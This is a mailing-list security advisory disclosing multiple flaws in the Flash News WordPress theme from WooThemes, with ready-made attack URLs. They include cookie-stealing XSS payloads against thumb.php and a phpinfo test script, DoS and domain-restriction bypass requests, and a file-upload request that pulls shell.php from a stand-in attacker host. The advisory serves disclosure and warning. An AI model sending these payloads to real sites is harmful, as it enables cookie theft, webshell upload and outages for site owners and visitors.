Subject: Multiple vulnerabilities in Flash News theme for
	WordPress

Hello list!

I want to warn you about multiple vulnerabilities in Flash News theme for 
WordPress. This is commercial theme for WP from WooThemes.

These are Cross-Site Scripting, Full path disclosure, Abuse of 
Functionality, Denial of Service, Arbitrary File Upload and Information 
Leakage vulnerabilities.

In 2011 I wrote about Cross-Site Scripting, Full path disclosure, Abuse of 
Functionality and Denial of Service vulnerabilities in TimThumb and multiple 
themes for WordPress (http://websecurity.com.ua/4910/), and later also was 
disclosed Arbitrary File Uploading vulnerability. After previous advisory, 
I've wrote another one about multiple themes from WooThemes 
(http://websecurity.com.ua/5071/) with Information Leakage and Cross-Site 
Scripting vulnerabilities (only part of their themes were affected).

If two years ago I've wrote about holes in TimThumb and multiples themes 
from WooThemes (where I mentioned Flash News), then this time I wrote 
directly about this particular theme. And also I've added other holes in it.

This is example for Flash News theme. In other themes from WooThemes the 
situation is similar. In above-mentioned advisory I've listed 89 vulnerable 
themes for WP from WooThemes.

-------------------------
Affected products:
-------------------------

Vulnerable are all versions of Flash News theme for WordPress (in last 
versions there were fixed only vulnerabilities in thumb.php). I've informed 
developers about these vulnerabilities already in beginning of 2011 (as 
about holes in TimThumb, as about holes in their native scripts in their 
themes - for WordPress and other engines).

After two years since I've informed WooThemes developers, there are hundreds 
thousands of sites with only Flash News theme (not mentioning all other 
themes), according to Google, and all of them are still vulnerable to many 
of these vulnerabilities. Mostly were fixed holes in thumb.php, but not in 
other vulnerable scripts of the theme, and there are many sites which have 
fixed only part of the holes in TimThumb in the theme. E.g. they fixed Code 
Execution (AFU), AoF and DoS holes, but XSS and FPD holes were left.

XSS (WASC-08):

http://site/wp-content/themes/flashnews/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg

Full path disclosure (WASC-13):

http://site/wp-content/themes/flashnews/thumb.php?src=1

http://site/wp-content/themes/flashnews/thumb.php?src=http://site/page.png&h=1&w=1111111

http://site/wp-content/themes/flashnews/thumb.php?src=http://site/page.png&h=1111111&w=1

Abuse of Functionality (WASC-42):

http://site/wp-content/themes/flashnews/thumb.php?src=http://site&h=1&w=1
http://site/wp-content/themes/flashnews/thumb.php?src=http://site.badsite.com&h=1&w=1 
(bypass of restriction on domain, if such restriction is turned on)

DoS (WASC-10):

http://site/wp-content/themes/flashnews/thumb.php?src=http://site/big_file&h=1&w=1
http://site/wp-content/themes/flashnews/thumb.php?src=http://site.badsite.com/big_file&h=1&w=1 
(bypass of restriction on domain, if such restriction is turned on)

About such Abuse of Functionality and Denial of Service vulnerabilities you 
can read in my article Using of the sites for attacks on other sites 
(http://lists.grok.org.uk/pipermail/full-disclosure/2010-June/075384.html).

Arbitrary File Upload (WASC-31) (in not fixed versions of TimThumb):

http://site/wp-content/themes/flashnews/thumb.php?src=http://site.badsite.com/shell.php

Full path disclosure (WASC-13):

http://site/wp-content/themes/flashnews/

Besides index.php there are also potentially FPD in other php-files of this 
theme.

Information Leakage (WASC-13):

http://site/wp-content/themes/flashnews/includes/test.php

Script with phpinfo.

XSS (WASC-08):

http://site/wp-content/themes/flashnews/includes/test.php?a[]=%3Cscript%3Ealert(document.cookie)%3C/script%3E

This XSS works in PHP < 4.4.1, 4.4.3-4.4.6 (where was possible to conduct 
XSS via phpinfo).
